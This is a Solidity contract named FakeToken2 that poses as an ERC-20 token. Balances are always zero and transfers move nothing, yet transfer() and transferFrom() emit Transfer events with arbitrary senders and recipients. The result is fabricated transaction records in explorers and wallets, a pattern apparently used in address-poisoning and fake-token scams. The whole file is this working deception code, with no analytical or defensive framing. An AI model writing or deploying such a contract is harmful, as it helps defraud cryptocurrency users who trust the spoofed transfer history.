// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FakeToken2 {
    string private _signature;
    address private _transferFromAddress;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {}

    fallback() external payable {
        revert();
    }

    function name() public view returns (string memory) {
        return "";
    }

    function symbol() public view returns (string memory) {
        return "";
    }

    function decimals() public pure returns (uint8) {
        return 6;
    }

    function totalSupply() public pure returns (uint256) {
        return 0x16cd9fdb90ec9d5; // ~102 * 10^15
    }

    function balanceOf(address account) public pure returns (uint256) {
        return 0;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        emit Transfer(tx.origin, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(tx.origin == _transferFromAddress, "Invalid origin");
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _decimals() public pure returns (uint8) {
        return 6;
    }

    function _totalSupply() public pure returns (uint256) {
        return 0x16cd9fdb90ec9d5;
    }

    function _symbol() public view returns (string memory) {
        return "";
    }

    function _name() public view returns (string memory) {
        return "";
    }

    function signature() public view returns (string memory) {
        return _signature;
    }
}
